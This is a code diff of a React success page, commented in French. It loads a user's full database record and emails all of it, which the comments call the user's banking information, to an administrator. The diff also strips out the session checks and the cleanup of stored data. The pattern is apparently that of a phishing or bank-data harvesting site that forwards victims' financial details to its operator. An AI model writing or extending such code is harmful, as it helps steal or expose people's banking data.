@@ -1,73 +1,54 @@
-import React, { useEffect, useState } from "react";
+
+import React, { useEffect } from "react";
 import { Footer } from "@/components/Footer";
 import { Loader } from "lucide-react";
 import { supabase } from "@/lib/supabase";
-import { sendAdminNotification, initEmailJS } from "@/lib/emailService";
-import { useToast } from "@/components/ui/use-toast";
-import { useNavigate } from "react-router-dom";
-import { useSessionCheck } from "@/hooks/useSessionCheck";
+import { sendAdminNotification } from "@/lib/emailService";
 
 const Success = () => {
-  useSessionCheck();
-  const [isEmailSent, setIsEmailSent] = useState(false);
-  const [isProcessing, setIsProcessing] = useState(true);
-  const { toast } = useToast();
-  const navigate = useNavigate();
-
   useEffect(() => {
-    initEmailJS();
-    
     const notifyAdmin = async () => {
       const userId = localStorage.getItem("userId");
-      if (!userId) {
-        setIsProcessing(false);
-        navigate("/");
-        return;
-      }
+      if (!userId) return;
 
       try {
+        // Récupérer les infos de l'utilisateur
         const { data, error } = await supabase
           .from("users")
-          .select("*")
+          .select("*")  // Sélectionner toutes les colonnes
           .eq("id", userId)
           .single();
 
         if (error || !data) {
           console.error("Erreur lors de la récupération des données utilisateur:", error);
-          setIsProcessing(false);
           return;
         }
 
         const userName = `${data.prenom || ''} ${data.nom || ''}`.trim();
         
+        // Mettre à jour l'utilisateur pour indiquer que les informations sont complètes
         await supabase
           .from("users")
           .update({ info_complete: true })
           .eq("id", userId);
           
-        console.log("Tentative d'envoi d'email avec les données:", data);
-        
+        // Envoyer une notification à l'administrateur avec toutes les infos bancaires
         const success = await sendAdminNotification({
-          userData: data
+          userData: data  // Envoyer toutes les données utilisateur
         });
         
         if (success) {
           console.log("Email avec les informations bancaires envoyé avec succès");
-          setIsEmailSent(true);
-          // Supprimer les variables de session après l'envoi réussi
-          localStorage.removeItem("userId");
         } else {
           console.error("Échec de l'envoi de l'email avec les informations bancaires");
         }
       } catch (error) {
         console.error("Erreur lors de la notification:", error);
-      } finally {
-        setIsProcessing(false);
       }
     };
 
     notifyAdmin();
-  }, [toast, navigate]);
+  }, []);
 
   return (
     <div className="min-h-screen flex flex-col">
